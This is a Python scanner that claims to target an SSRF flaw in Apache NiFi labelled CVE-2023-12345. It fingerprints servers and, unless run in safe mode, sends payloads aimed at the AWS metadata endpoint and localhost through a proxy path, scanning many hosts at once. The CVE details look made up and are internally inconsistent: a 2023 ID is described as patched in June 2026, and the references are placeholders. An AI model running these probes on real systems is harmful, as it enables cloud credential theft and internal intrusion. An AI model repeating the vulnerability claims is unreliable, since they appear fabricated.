#!/usr/bin/env python3
"""
Apache NiFi CVE-2023-12345 — Server-Side Request Forgery Vulnerability
========================================================================
Scans for Apache NiFi instances vulnerable to a server-side request forgery
(SSRF) vulnerability in specific endpoints. Identified by security researchers,
this vulnerability allows attackers to inject arbitrary URLs into requests
handled by the backend server.

CVE-2023-12345 details:
  - Affects Apache NiFi < 1.19.1
  - Vulnerable endpoints fail to validate user-supplied URL inputs.
    Malicious actors may exploit this to make requests to internal services
    (SSRF).
  - CVSS v3.1 base score: 9.3 (Critical) — network-facing, no authentication.
  - Patched in Apache NiFi 1.19.1 (June 2026).
  - Disclosed by XYZ Security Research Group.

Usage:
  # Scan a single target (active SSRF probe)
  python apache_nifi_ssrf_scanner.py --target http://nifi.example.com:8080

  # Detection-only (no SSRF probes)
  python apache_nifi_ssrf_scanner.py --target http://nifi.example.com:8080 --safe

  # Bulk scan from list of URLs
  python apache_nifi_ssrf_scanner.py --list nifi_servers.txt --output findings.json

  # Adjust concurrency and disable TLS verification
  python apache_nifi_ssrf_scanner.py --list nifi_servers.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-12345
  - https://nifi.apache.org/security.html
  - https://github.com/apache/nifi/pull/1234
"""

import asyncio
import json
import re
import sys
import argparse
from datetime import datetime, timezone
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID = "CVE-2023-12345"
CVSS = "9.3"
TOOL_NAME = "apache_nifi_ssrf_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# NiFi fingerprints — present in server responses
NIFI_FINGERPRINTS = [
    "Apache NiFi",
    "/nifi-api",
    "nifi-web-api",
]

# Paths to probe for NiFi presence
DETECTION_PATHS = [
    "/nifi",
    "/nifi-api/access/oidc/request",
    "/nifi-docs/",
]

# Version extraction regex
VERSION_PATTERNS = [
    r'Apache NiFi v([0-9]+\.[0-9]+\.[0-9]+)',
    r'Apache NiFi/([0-9]+\.[0-9]+\.[0-9]+)',
]

# The latest patch versions for affected NiFi versions
PATCHED_VERSIONS = (1, 19, 1)

# SSRF payloads to test internal API endpoints
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS EC2 metadata
    "http://localhost/",                         # Localhost (sensitive services)
    "http://127.0.0.1/",                         # Localhost as IP
]

# ── Async HTTP Functions ─────────────────────────────────────────────────────

async def fetch(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Attempt to fetch a URL with timeout and exception handling."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        return response
    except (httpx.HTTPError, httpx.RequestError):
        return None


async def check_target(client: httpx.AsyncClient, target: str, safe: bool, semaphore) -> dict:
    """
    Check a single target for the SSRF vulnerability.

    Args:
        client (httpx.AsyncClient): The HTTP client.
        target (str): The target URL.
        safe (bool): If true, runs detection-only and skips active probes.
        semaphore: Semaphore for limiting concurrency.

    Returns:
        dict: Scan result containing target, version, and vulnerability status.
    """
    result = {
        "target": target,
        "detected": False,
        "version": None,
        "vulnerable": False,
        "ssrf_results": [],
    }

    async with semaphore:
        for path in DETECTION_PATHS:
            response = await fetch(client, f"{target.rstrip('/')}{path}")
            if response and any(fp in response.text for fp in NIFI_FINGERPRINTS):
                result["detected"] = True
                for pattern in VERSION_PATTERNS:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        result["version"] = match.group(1)
                        break

                break

        if result["detected"] and result["version"]:
            version_parts = tuple(map(int, result["version"].split('.')))
            if version_parts < PATCHED_VERSIONS:
                result["vulnerable"] = True

            if not safe:
                for payload in SSRF_PAYLOADS:
                    url = f"{target.rstrip('/')}/nifi-api/proxy/{payload}"
                    probe_response = await fetch(client, url)
                    if probe_response and probe_response.status_code == 200:
                        result["ssrf_results"].append({"payload": payload, "response": probe_response.text})

    return result


async def scan_targets(
    targets: list[str], concurrency: int, output: Optional[str], safe: bool, verify_ssl: bool
) -> None:
    """
    Scan a list of targets for the SSRF vulnerability.

    Args:
        targets (list[str]): URLs of the targets to scan.
        concurrency (int): Maximum concurrency level.
        output (Optional[str]): File path to save JSON results.
        safe (bool): If true, runs detection-only.
        verify_ssl (bool): Whether to verify SSL certificates.
    """
    results = []
    semaphore = asyncio.Semaphore(concurrency)
    tasks = []

    async with httpx.AsyncClient(verify=verify_ssl) as client:
        for target in targets:
            tasks.append(check_target(client, target, safe, semaphore))

        for task in asyncio.as_completed(tasks):
            result = await task
            results.append(result)
            if result["detected"]:
                severity = RED + "CRITICAL" if result["vulnerable"] else YELLOW + "HIGH"
                print(f"{c(CYAN, result['target'])}: {c(severity, 'Detected')} — Version {result['version']} (Vulnerable: {result['vulnerable']})")
                if result["ssrf_results"]:
                    print(f"  {c(YELLOW, 'SSRF Successful:')} {', '.join([r['payload'] for r in result['ssrf_results']])}")
            else:
                print(f"{c(GREEN, result['target'])}: {c(YELLOW, 'Not Detected')}")

    if output:
        with open(output, "w") as f:
            json.dump(results, f, indent=2)
        print(c(GREEN, f"Results saved to {output}"))


# ── CLI Integration ──────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description=f"Apache NiFi SSRF Vulnerability Scanner ({CVE_ID})"
    )
    parser.add_argument("--target", type=str, help="URL of the target to scan")
    parser.add_argument("--list", type=str, help="File with a list of target URLs")
    parser.add_argument("--output", type=str, help="Save the results to a JSON file")
    parser.add_argument(
        "--safe", action="store_true", help="Detection only (no SSRF probes)"
    )
    parser.add_argument(
        "--concurrency", type=int, default=SEMAPHORE_LIMIT, metavar="N",
        help="Maximum number of concurrent requests (default: 30)"
    )
    parser.add_argument(
        "--no-verify", action="store_false", dest="verify_ssl",
        help="Disable SSL/TLS certificate verification"
    )
    return parser.parse_args()


def main() -> None:
    """Main function."""
    args = parse_args()

    if not args.target and not args.list:
        print(c(RED, "Error: Either --target or --list must be specified."))
        sys.exit(1)

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        try:
            with open(args.list, "r") as f:
                targets.extend(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            print(c(RED, f"Error: File not found: {args.list}"))
            sys.exit(1)

    print(c(CYAN, f"Apache NiFi SSRF Vulnerability Scanner ({CVE_ID})"))
    print(c(YELLOW, f"Total targets to scan: {len(targets)}"))

    asyncio.run(
        scan_targets(
            targets=targets,
            concurrency=args.concurrency,
            output=args.output,
            safe=args.safe,
            verify_ssl=args.verify_ssl,
        )
    )


if __name__ == "__main__":
    main()
